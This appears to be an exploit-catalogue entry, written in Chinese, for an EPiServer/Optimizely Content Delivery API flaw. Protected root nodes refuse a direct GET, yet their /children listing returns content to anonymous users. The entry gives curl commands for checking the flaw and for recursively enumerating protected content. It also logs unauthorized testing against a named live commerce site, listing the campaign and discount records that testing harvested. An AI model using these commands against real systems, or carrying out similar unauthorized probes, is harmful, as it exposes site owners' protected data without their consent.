# EPiServer/Optimizely Content Delivery API v2：/content/{id}/children 不校验父级 ACL，匿名读取被保护根节点子内容

- **code**: episerver-cdapi-children-parent-acl-bypass
- **kind**: poc
- **category**: unauthorized
- **component**: Optimizely / EPiServer Content Delivery API v2.0
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 19:46-19:56 UTC 本机 curl/python3 实测 https://www.greenmangaming.com/api/episerver/v2.0：GET /content/5 → 403 56B Access denied，同 id GET /content/5/children → 200 156226B 返回 145 条 GmgCampaignData；/content/1 → 403 而 /content/1/children → 200（Headless Root）；BFS 全量 636 节点（145 活动/478 PublisherDiscountType/5 VipDiscountType）。OPTIONS→Allow: GET，POST→405，interface 纯只读。
- **tags**: episerver,optimizely,content-delivery-api,unauthorized,access-control,children,acl-bypass
- **created_at**: 2026-11-11T19:55:14.790Z
- **engine**: https://www.greenmangaming.com

## 描述

EPiServer Content Delivery API v2.0 的 children 列表端点未复用单条内容的内容级 ACL：被保护的根节点（sysCampaignRoot/rootPage/globalAssetsRoot/contentAssetsRoot/wasteBasket/startPage）单条 GET 恒 403，但其 children 匿名 200 返回完整 JSON，并可逐级递归枚举子内容与属性。判据=同 id 父 403 + 子列表 200。只读面，拿不到写权限。

## 用法

```
# 判据（父 403 vs 子 200）
B="https://TARGET/api/episerver/v2.0"
curl -s -A "$UA" -w '|%{http_code} %{size_download}\n' "$B/content/5"          # {"error":{"code":"Forbidden"...}}|403 56
curl -s -A "$UA" -w '|%{http_code} %{size_download}\n' "$B/content/5/children" # 大 JSON（GmgCampaignData 等）|200
# 取站点内容根 id（rootPage/startPage/globalAssetsRoot/contentAssetsRoot/wasteBasket/sysCampaignRoot）
curl -s -A "$UA" "$B/site"
# 递归枚举：对每个 children 元素 contentLink.id 继续 /content/{id}/children，可拿 PublisherDiscountType/VipDiscountType 等
# 边界：OPTIONS → Allow: GET；POST → 405；加 select/epieditmode/preview/workId/GUID 变体不能绕过单条 403
```
